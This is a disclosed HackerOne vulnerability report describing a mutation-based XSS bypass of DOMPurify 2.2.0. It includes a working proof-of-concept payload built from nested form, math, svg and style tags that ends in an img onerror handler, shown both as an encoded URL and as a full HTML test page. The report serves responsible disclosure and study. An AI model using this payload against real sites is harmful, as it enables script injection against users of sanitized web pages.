# DOMPurify bypass

## Report Details
- **Report ID**: 1024734
- **URL**: https://hackerone.com/reports/1024734
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-11-02T19:06:35.920Z
- **Disclosed**: 2020-12-17T04:43:16.622Z

## Reporter
- **Username**: vovohelo
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ibb

## Vulnerability Information
A mutation based bypass exists in DOMPurify when sanitizing svg elements using almost the same technique described by Michał Bentkowski
(@SecurityMB) at https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/.

A PoC payload with the DOM state before and after parsing is available at https://livedom.lab.xss.academy/#%7B%22input%22%3A%22%3Cform%3E%3Cmath%3E%3Cmtext%3E%3C%2Fform%3E%3Cform%3E%3Cmglyph%3E%3Csvg%3E%3Cmtext%3E%3Cstyle%3E%3Cpath%20id%3D%5C%22%3C%2Fstyle%3E%3Cimg%20onerror%3Dalert(1)%20src%3E%5C%22%3E%22%2C%22parser%22%3A%22DOMPurify%20Latest%22%7D

The following is a PoC html document that uses DOMPurify's latest version available at https://github.com/cure53/DOMPurify/releases/tag/2.2.0

```html
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN" "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="./purify.js"></script>
    <title>DOMPurify bypass</title>
</head>

<body>
    <script>
        const html='<form><math><mtext></form><form><mglyph><svg><mtext><style><path id="</style><img onerror=alert(\'XSS\') src>">';
        const sanitized = DOMPurify.sanitize(html);
        let div = document.createElement('div');
        div.innerHTML = sanitized;
    </script>
</body>

</html>
```

The issue was already reported to the DOMPurify's team at https://github.com/cure53/DOMPurify/issues/482

## Impact

Websites using DOMPurify with its default configuration are vulnerable to XSS.

## Attachments
No attachments
